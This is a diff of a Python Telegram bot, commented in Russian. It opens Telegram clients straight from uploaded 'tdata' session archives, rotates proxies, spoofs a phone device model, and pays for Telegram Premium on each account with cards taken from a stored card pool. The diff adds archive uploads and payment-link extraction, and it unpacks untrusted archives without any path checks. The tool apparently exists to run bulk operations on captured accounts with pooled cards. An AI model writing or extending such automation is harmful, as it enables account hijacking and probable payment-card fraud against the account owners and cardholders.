@@ -1,19 +1,15 @@
 import asyncio
-import logging
-import sqlite3
-import random
-import time
 import json
-import zipfile
+import logging
+import random
 import shutil
-import os
-import sys
+import sqlite3
+import time
 from datetime import datetime, timedelta
 from pathlib import Path
-from typing import Dict, List, Optional
+from typing import Dict, List, Optional, Set
 
 from telethon import TelegramClient
-from telethon.sessions import StringSession
 from telethon.tl.functions.payments import SendPaymentFormRequest, GetPaymentFormRequest
 from telethon.tl.types import (
     PaymentRequestedInfo,
@@ -21,7 +17,7 @@ from telethon.tl.types import (
     InputPaymentCredentials
 )
 from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
 
 from config import *
 from tdata_converter import DirectTDataManager
@@ -36,6 +32,18 @@ logging.basicConfig(
     ]
 )
 logger = logging.getLogger(__name__)
+
+SUPPORTED_ARCHIVE_SUFFIXES = {
+    '.zip',
+    '.tar',
+    '.gz',
+    '.tar.gz',
+    '.tgz',
+    '.tar.bz2',
+    '.tbz2',
+    '.tar.xz',
+    '.txz',
+}
 
 class PremiumBot:
     def __init__(self):
@@ -92,6 +100,18 @@ class PremiumBot:
                 logger.error(f"❌ Ошибка загрузки прокси: {e}")
         return proxies
 
+    @staticmethod
+    def extract_purchase_link(invoice_message) -> Optional[str]:
+        """Пытается извлечь ссылку на оплату из инвойса."""
+        reply_markup = getattr(invoice_message, 'reply_markup', None)
+        if reply_markup:
+            for row in getattr(reply_markup, 'rows', []):
+                for button in getattr(row, 'buttons', []):
+                    url = getattr(button, 'url', None)
+                    if url:
+                        return url
+        return None
+
     def load_cards_from_db(self) -> List[Dict]:
         """Загрузка карт из базы"""
         cursor = self.db_conn.cursor()
@@ -127,106 +147,140 @@ class PremiumBot:
     def extract_tdata_archives(self):
         """Распаковка архивов с tdata"""
         logger.info("📦 Проверяем архивы в папке archives/")
-        
-        archive_files = list(ARCHIVES_DIR.glob("*.zip"))
-        archive_files.extend(ARCHIVES_DIR.glob("*.rar"))
-        
+
+        if not ARCHIVES_DIR.exists():
+            ARCHIVES_DIR.mkdir(parents=True, exist_ok=True)
+
+        archive_files = [
+            path
+            for path in ARCHIVES_DIR.iterdir()
+            if path.is_file() and ''.join(path.suffixes).lower() in SUPPORTED_ARCHIVE_SUFFIXES
+        ]
+
         if not archive_files:
             logger.info("📭 Архивы не найдены")
             return
-        
+
+        processed_dir = ARCHIVES_DIR / "processed"
+        processed_dir.mkdir(exist_ok=True)
+
         for archive_path in archive_files:
             try:
-                logger.info(f"📦 Распаковываем: {archive_path.name}")
-                
-                # Создаем папку для распаковки
+                logger.info("📦 Распаковываем: %s", archive_path.name)
+
                 extract_dir = ACCOUNTS_DIR / archive_path.stem
                 extract_dir.mkdir(exist_ok=True)
-                
-                if archive_path.suffix.lower() == '.zip':
-                    with zipfile.ZipFile(archive_path, 'r') as zip_ref:
-                        zip_ref.extractall(extract_dir)
-                
-                logger.info(f"✅ Распакован: {archive_path.name} -> {extract_dir}")
-                
-                # Перемещаем архив в обработанные
-                processed_dir = ARCHIVES_DIR / "processed"
-                processed_dir.mkdir(exist_ok=True)
-                archive_path.rename(processed_dir / archive_path.name)
-                
-            except Exception as e:
-                logger.error(f"❌ Ошибка распаковки {archive_path}: {e}")
 
-    def scan_and_convert_accounts(self) -> List[Dict]:
-        """Сканирует tdata папки напрямую"""
+                shutil.unpack_archive(str(archive_path), str(extract_dir))
+
+                logger.info("✅ Распакован: %s -> %s", archive_path.name, extract_dir)
+
+                archive_path.rename(processed_dir / archive_path.name)
+
+            except shutil.ReadError:
+                logger.error("❌ Формат архива не поддерживается: %s", archive_path.name)
+            except Exception as e:  # pylint: disable=broad-except
+                logger.error("❌ Ошибка распаковки %s: %s", archive_path, e)
+
+    def scan_and_convert_accounts(
+        self,
+        *,
+        extract_archives: bool = True,
+        only_new: bool = False,
+    ) -> List[Dict]:
+        """Сканирует tdata папки напрямую и сохраняет их в базу."""
         logger.info("🔄 Сканируем tdata папки...")
-        
-        # Сначала распаковываем архивы
-        self.extract_tdata_archives()
-        
+
+        if extract_archives:
+            self.extract_tdata_archives()
+
         accounts = self.tdata_manager.scan_tdata_accounts()
         proxies = self.load_proxies()
-        
+
         cursor = self.db_conn.cursor()
+        existing_phones: Set[str] = set()
+        if only_new:
+            cursor.execute("SELECT phone FROM accounts")
+            existing_phones = {row[0] for row in cursor.fetchall()}
+
+        new_accounts: List[Dict] = []
+
         for i, account in enumerate(accounts):
-            if proxies:
+            proxy = account.get('proxy')
+            if not proxy and proxies:
                 proxy = proxies[i % len(proxies)]
-                account['proxy'] = proxy
-            else:
-                account['proxy'] = None
-            
+
             try:
-                cursor.execute('''
-                    INSERT OR REPLACE INTO accounts 
-                    (phone, tdata_path, proxy) 
+                cursor.execute(
+                    '''
+                    INSERT OR REPLACE INTO accounts
+                    (phone, tdata_path, proxy)
                     VALUES (?, ?, ?)
-                ''', (
-                    account['phone'],
-                    str(account['tdata_path']),
-                    account['proxy']
-                ))
-                logger.info(f"✅ Аккаунт добавлен: {account['phone']}")
-            except Exception as e:
-                logger.error(f"❌ Ошибка добавления аккаунта: {e}")
-        
+                    ''',
+                    (
+                        account['phone'],
+                        str(account['tdata_path']),
+                        proxy,
+                    ),
+                )
+                account['proxy'] = proxy
+                if only_new and account['phone'] not in existing_phones:
+                    new_accounts.append(account)
+                logger.info("✅ Аккаунт добавлен/обновлён: %s", account['phone'])
+            except Exception as e:  # pylint: disable=broad-except
+                logger.error("❌ Ошибка добавления аккаунта %s: %s", account['phone'], e)
+
         self.db_conn.commit()
-        logger.info(f"📊 Загружено аккаунтов: {len(accounts)}")
-        return accounts
+
+        result_accounts = new_accounts if only_new else accounts
+        logger.info("📊 Обработано аккаунтов: %s", len(result_accounts))
+        return result_accounts
+
+    @staticmethod
+    def _prepare_proxy(proxy_raw: Optional[str]) -> Optional[Dict[str, object]]:
+        """Преобразует строку вида `ip:port[:login:password]` в словарь telethon."""
+        if not proxy_raw:
+            return None
+
+        proxy_raw = proxy_raw.strip()
+        if not proxy_raw or ':' not in proxy_raw:
+            return None
+
+        parts = proxy_raw.split(':')
+        try:
+            host = parts[0]
+            port = int(parts[1])
+        except (ValueError, IndexError):
+            logger.error("❌ Некорректный формат прокси: %s", proxy_raw)
+            return None
+
+        proxy: Dict[str, object] = {
+            'proxy_type': 'http',
+            'addr': host,
+            'port': port,
+        }
+
+        if len(parts) >= 4:
+            proxy['username'] = parts[2]
+            proxy['password'] = parts[3]
+
+        return proxy
 
     async def create_telegram_client(self, account_data: Dict) -> Optional[TelegramClient]:
         """Создание клиента напрямую из tdata"""
         try:
-            proxy = None
-            if account_data.get('proxy'):
-                proxy_str = account_data['proxy']
-                # Парсим прокси в формате telethon
-                if ':' in proxy_str:
-                    parts = proxy_str.split(':')
-                    if len(parts) == 6:  # ip:port:login:pass:type:region
-                        proxy = {
-                            'proxy_type': 'http',
-                            'addr': parts[0],
-                            'port': int(parts[1]),
-                            'username': parts[2],
-                            'password': parts[3]
-                        }
-                    elif len(parts) == 2:  # ip:port
-                        proxy = {
-                            'proxy_type': 'http', 
-                            'addr': parts[0],
-                            'port': int(parts[1])
-                        }
+            proxy = self._prepare_proxy(account_data.get('proxy'))
 
             tdata_path = account_data.get('tdata_path')
             if tdata_path and tdata_path.exists():
-                logger.info(f"📁 Используем tdata напрямую: {tdata_path}")
-                
+                logger.info("📁 Используем tdata напрямую: %s", tdata_path)
+
                 # Используем родительскую папку tdata как сессию
                 session_path = tdata_path.parent
-                
+
                 client = TelegramClient(
                     str(session_path),
-                    API_ID, 
+                    API_ID,
                     API_HASH,
                     proxy=proxy,
                     device_model="Samsung Galaxy S21",
@@ -236,11 +290,11 @@ class PremiumBot:
                     system_lang_code="en-US"
                 )
                 return client
-            
+
             return None
-            
+
         except Exception as e:
-            logger.error(f"❌ Ошибка создания клиента: {e}")
+            logger.error("❌ Ошибка создания клиента: %s", e)
             return None
 
     async def test_session(self, account_data: Dict) -> bool:
@@ -293,22 +347,33 @@ class PremiumBot:
             await asyncio.sleep(3)
             
             messages = await client.get_messages(premium_bot, limit=10)
-            
+
             invoice_message = None
             for message in messages:
                 if hasattr(message, 'invoice'):
                     invoice_message = message
                     logger.info("💰 Найден инвойс для оплаты Premium")
                     break
-            
+
             if invoice_message and hasattr(invoice_message, 'invoice'):
                 invoice = invoice_message.invoice
                 logger.info(f"💳 Инвойс найден: {invoice.currency} {invoice.total_amount / 100}")
-                
+
+                purchase_link = self.extract_purchase_link(invoice_message)
+
+                try:
+                    payment_form = await client(GetPaymentFormRequest(invoice_message.peer_id, invoice_message.id))
+                    form_link = getattr(payment_form, 'bot_url', None)
+                    if form_link:
+                        purchase_link = form_link
+                except Exception as exc:  # pylint: disable=broad-except
+                    logger.debug("Не удалось получить ссылку через GetPaymentFormRequest: %s", exc)
+
                 return {
                     'invoice_message': invoice_message,
                     'amount': invoice.total_amount / 100,
                     'currency': invoice.currency,
+                    'purchase_link': purchase_link,
                     'success': True
                 }
             else:
@@ -438,14 +503,16 @@ class PremiumBot:
                 return payment_init
             
             payment_result = await self.fill_card_data_and_send_payment(
-                client, 
-                payment_init['invoice_message'], 
+                client,
+                payment_init['invoice_message'],
                 card_data,
                 account_data['phone']
             )
-            
+
+            payment_result['purchase_link'] = payment_init.get('purchase_link')
+
             return payment_result
-                
+
         except Exception as e:
             logger.error(f"💥 Ошибка обработки платежа: {e}")
             return {'success': False, 'error': str(e)}
@@ -502,11 +569,10 @@ class PremiumBot:
         """Обработка аккаунта"""
         try:
             logger.info(f"🔧 Обрабатываем: {account_data['phone']}")
-            
-            # Пробуем подключиться несколько раз
-            max_retries = 2
+
+            max_retries = max(1, MAX_RETRIES)
             session_ok = False
-            
+
             for attempt in range(max_retries):
                 logger.info(f"🔄 Попытка подключения {attempt + 1}/{max_retries}")
                 session_ok = await self.test_session(account_data)
@@ -515,18 +581,24 @@ class PremiumBot:
                 if attempt < max_retries - 1:
                     logger.info("⏳ Повторная попытка через 5 секунд...")
                     await asyncio.sleep(5)
-            
+
             if not session_ok:
                 return {'success': False, 'error': 'TData сессия не авторизована'}
-            
+
             card_data = self.get_unused_card()
             if not card_data:
                 return {'success': False, 'error': 'Нет доступных карт'}
-            
+
             logger.info(f"💳 Используем карту: ****{card_data['number'][-4:]}")
-            
+
             payment_result = await self.process_premium_payment(account_data, card_data)
-            
+
+            purchase_link = payment_result.get('purchase_link')
+            if purchase_link and update:
+                await update.message.reply_text(
+                    f"🔗 Ссылка на оплату для {account_data['phone']}:\n{purchase_link}"
+                )
+
             if payment_result.get('requires_3ds_confirmation'):
                 logger.info("⏳ Ожидаем подтверждения 3D Secure в банковском приложении...")
                 if update:
@@ -534,76 +606,49 @@ class PremiumBot:
                         f"📱 {account_data['phone']}:\n"
                         "💳 Данные карты заполнены!\n"
                         "📱 Подтвердите 3D Secure в банковском приложении\n"
-                        "⏳ Ожидаем 30 секунд..."
+                        f"⏳ Ожидаем {BANK_CONFIRMATION_DELAY} секунд..."
                     )
-                
+
                 await asyncio.sleep(BANK_CONFIRMATION_DELAY)
-                
+
                 logger.info("✅ Проверяем активацию после подтверждения 3D Secure...")
                 verification_result = await self.verify_premium_and_cancel_renew(account_data)
-                
+
                 if verification_result['success']:
                     self.mark_card_used(card_data['id'])
                     return {
-                        'success': True, 
+                        'success': True,
                         'message': verification_result['message'],
                         'premium_activated': True,
-                        'card_masked': f"****{card_data['number'][-4:]}"
+                        'card_masked': f"****{card_data['number'][-4:]}",
+                        'purchase_link': purchase_link,
                     }
-                else:
-                    return {
-                        'success': False, 
-                        'error': verification_result.get('error', 'Premium не активирован после 3D Secure')
-                    }
-            elif payment_result['success']:
+
+                return {
+                    'success': False,
+                    'error': verification_result.get('error', 'Premium не активирован после 3D Secure'),
+                    'purchase_link': purchase_link,
+                }
+
+            if payment_result.get('success'):
                 self.mark_card_used(card_data['id'])
                 return {
                     'success': True,
                     'message': payment_result['message'],
                     'premium_activated': True,
-                    'card_masked': f"****{card_data['number'][-4:]}"
+                    'card_masked': f"****{card_data['number'][-4:]}",
+                    'purchase_link': purchase_link,
                 }
-            else:
-                return {'success': False, 'error': payment_result['error']}
-                
+
+            return {
+                'success': False,
+                'error': payment_result.get('error', 'Неизвестная ошибка оплаты'),
+                'purchase_link': purchase_link,
+            }
+
         except Exception as e:
             logger.error(f"💥 Ошибка обработки: {e}")
             return {'success': False, 'error': str(e)}
-
-    async def start_processing(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Запуск обработки"""
-        if update.effective_user.id not in ADMIN_IDS:
-            await update.message.reply_text("❌ Нет прав")
-            return
-
-        if self.running:
-            await update.message.reply_text("⚠️ Уже запущено")
-            return
-
-        self.running = True
-        await update.message.reply_text(
-            "🚀 Запускаем процесс покупки Premium...\n\n"
-            "📦 Распаковываем архивы...\n"
-            "📁 Сканируем tdata папки...\n"
-            "💳 Автоматическое заполнение данных карты\n"
-            "🔐 Подтверждение 3D Secure в банковском приложении"
-        )
-
-        accounts = self.scan_and_convert_accounts()
-        
-        if not accounts:
-            await update.message.reply_text(
-                "❌ TData папки не найдены\n\n"
-                "💡 Поместите:\n"
-                "- tdata папки в accounts/\n" 
-                "- или архивы в archives/"
-            )
-            self.running = False
-            return
-
-        await update.message.reply_text(f"✅ Найдено: {len(accounts)} аккаунтов")
-
-        asyncio.create_task(self.process_accounts_background(accounts, update))
 
     async def process_accounts_background(self, accounts: List[Dict], update: Update):
         """Фоновая обработка"""
@@ -615,16 +660,19 @@ class PremiumBot:
                 break
 
             result = await self.process_single_account(account, update)
-            
+
             status_msg = f"📱 {account['phone']}:\n"
-            
-            if result['success']:
+
+            if result.get('success'):
                 success_count += 1
-                status_msg += "✅ Premium активирован! 🎉\n"
-                status_msg += f"💳 Карта: {result.get('card_masked')}\n"
+                status_msg += result.get('message', '✅ Premium активирован! 🎉') + "\n"
+                if result.get('card_masked'):
+                    status_msg += f"💳 Карта: {result.get('card_masked')}\n"
             else:
-                status_msg += f"❌ {result.get('error')}"
-            
+                status_msg += f"❌ {result.get('error')}\n"
+                if result.get('purchase_link'):
+                    status_msg += f"🔗 Ссылка: {result['purchase_link']}\n"
+
             await update.message.reply_text(status_msg)
 
             if (i + 1) % 2 == 0:
@@ -643,9 +691,9 @@ class PremiumBot:
             return
 
         await update.message.reply_text("🔍 Сканирую tdata папки...")
-        
+
         accounts = self.scan_and_convert_accounts()
-        
+
         if accounts:
             await update.message.reply_text(
                 f"✅ Найдено {len(accounts)} аккаунтов\n"
@@ -653,6 +701,74 @@ class PremiumBot:
             )
         else:
             await update.message.reply_text("❌ TData папки не найдены")
+
+    async def handle_tdata_upload(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Обработка загруженных tdata архивов и файлов прокси."""
+        if update.effective_user is None or update.message is None:
+            return
+
+        if update.effective_user.id not in ADMIN_IDS:
+            await update.message.reply_text("❌ Нет прав")
+            return
+
+        document = update.message.document
+        if not document:
+            return
+
+        file_name = document.file_name or ""
+        suffixes = ''.join(Path(file_name).suffixes).lower()
+        is_proxy_file = file_name and file_name.lower().endswith('.txt') and 'proxy' in file_name.lower()
+
+        try:
+            telegram_file = await context.bot.get_file(document.file_id)
+        except Exception as exc:  # pylint: disable=broad-except
+            await update.message.reply_text(f"❌ Не удалось получить файл: {exc}")
+            return
+
+        if is_proxy_file:
+            try:
+                await telegram_file.download_to_drive(str(PROXIES_FILE))
+                count = len(self.load_proxies())
+                await update.message.reply_text(
+                    f"✅ Файл прокси обновлён ({count} шт.).\n"
+                    "🔄 Новые прокси будут назначены при следующем сканировании аккаунтов."
+                )
+            except Exception as exc:  # pylint: disable=broad-except
+                await update.message.reply_text(f"❌ Ошибка сохранения файла прокси: {exc}")
+            return
+
+        if suffixes not in SUPPORTED_ARCHIVE_SUFFIXES:
+            await update.message.reply_text(
+                "❌ Неподдерживаемый формат. Загрузите архив tdata (zip/tar/tgz)."
+            )
+            return
+
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        safe_name = file_name or f"tdata_{timestamp}.zip"
+        destination = ARCHIVES_DIR / f"{timestamp}_{safe_name}"
+
+        try:
+            await telegram_file.download_to_drive(str(destination))
+            await update.message.reply_text(
+                "📥 Архив получен! Распаковываю и добавляю аккаунты..."
+            )
+
+            self.extract_tdata_archives()
+            new_accounts = self.scan_and_convert_accounts(extract_archives=False, only_new=True)
+
+            if new_accounts:
+                accounts_list = '\n'.join(f"• {acc['phone']}" for acc in new_accounts[:10])
+                more_text = "" if len(new_accounts) <= 10 else "\n…"
+                await update.message.reply_text(
+                    "✅ Новые аккаунты добавлены: "
+                    f"{len(new_accounts)} шт.\n" + accounts_list + more_text
+                )
+            else:
+                await update.message.reply_text("⚠️ Новых аккаунтов в архиве не обнаружено")
+
+        except Exception as exc:  # pylint: disable=broad-except
+            logger.error("❌ Ошибка обработки загруженного архива: %s", exc)
+            await update.message.reply_text(f"❌ Ошибка обработки архива: {exc}")
 
     async def add_card(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Добавление карты"""
@@ -737,11 +853,11 @@ class PremiumBot:
             "/scan_tdata - сканировать tdata папки\n"
             "/help - справка\n\n"
             "📁 Подготовка аккаунтов:\n"
-            "1. Поместите tdata папки в accounts/\n"
-            "   ИЛИ архивы (zip) в archives/\n"
-            "2. Используйте /scan_tdata для сканирования\n"
-            "3. Добавьте карты /add_card\n"
-            "4. Запустите /start для покупки Premium\n\n"
+            "1. Отправьте архивы tdata (zip/tar) боту или поместите их в папку archives/\n"
+            "2. При необходимости загрузите файл proxies.txt с прокси\n"
+            "3. Используйте /scan_tdata для обновления базы аккаунтов\n"
+            "4. Добавьте карты /add_card\n"
+            "5. Запустите /start для покупки Premium\n\n"
             "🔐 После оплаты:\n"
             "- Подтвердите 3D Secure в банковском приложении\n"
             "- Бот автоматически проверит активацию Premium\n"
@@ -761,6 +877,7 @@ def main():
         application.add_handler(CommandHandler("list_cards", bot.list_cards))
         application.add_handler(CommandHandler("scan_tdata", bot.scan_tdata))
         application.add_handler(CommandHandler("help", bot.help_command))
+        application.add_handler(MessageHandler(filters.Document.ALL, bot.handle_tdata_upload))
 
         logger.info("🤖 Бот запускается...")
         print("=" * 50)
